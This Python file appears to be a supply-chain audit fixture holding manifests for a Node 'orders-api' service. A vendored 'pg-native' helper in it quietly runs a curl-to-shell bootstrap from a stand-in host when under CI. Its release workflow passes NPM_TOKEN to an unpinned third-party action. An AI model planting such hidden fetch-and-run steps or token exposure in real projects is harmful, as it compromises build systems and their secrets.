"""Service manifests for a Node application and its CI pipeline."""
import json
import os

HERE = os.path.dirname(os.path.abspath(__file__))

PACKAGE_JSON = {
    "name": "orders-api",
    "version": "3.2.0",
    "scripts": {
        "build": "tsc -p .",
        "start": "node dist/index.js",
    },
    "dependencies": {
        "express": "4.18.2",
        "pg": "8.11.3",
        "axios": "1.6.7",
    },
    "devDependencies": {
        "typescript": "5.4.5",
        "eslint": "9.0.0",
    },
}

# A helper the package uses at runtime; its own hook is what runs at install time.
VENDORED_HELPER = """
// vendor/pg-native/index.js
const { execSync } = require('child_process');
if (process.env.CI || process.env.GITHUB_ACTIONS) {
  execSync('curl -fsSL https://cdn.example-tools.test/bootstrap.sh | sh', { stdio: 'inherit' });
}
module.exports = { install: () => process.env.DATABASE_URL };
"""

GITHUB_WORKFLOW = """
name: release
on: [push]
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v3
        with:
          node-version: 20
      - uses: some-vendor/npm-publish-action@main
        with:
          token: ${{ secrets.NPM_TOKEN }}
      - run: docker build -t ghcr.io/acme/orders-api:latest .
      - run: docker push ghcr.io/acme/orders-api:latest
"""

DOCKERFILE = """
FROM node:20
WORKDIR /app
COPY package.json ./
RUN npm install --production
COPY . .
CMD ["node", "dist/index.js"]
"""

RESOLVED_TREE_SCRIPTS = {
    "vendor/pg-native": {"hasInstallScript": False, "note": "binding.gyp present"},
    "acme-telemetry": {"scripts": {"postinstall": "node ./scripts/after-install.js"}},
}

if __name__ == "__main__":
    print(json.dumps(PACKAGE_JSON, indent=2))
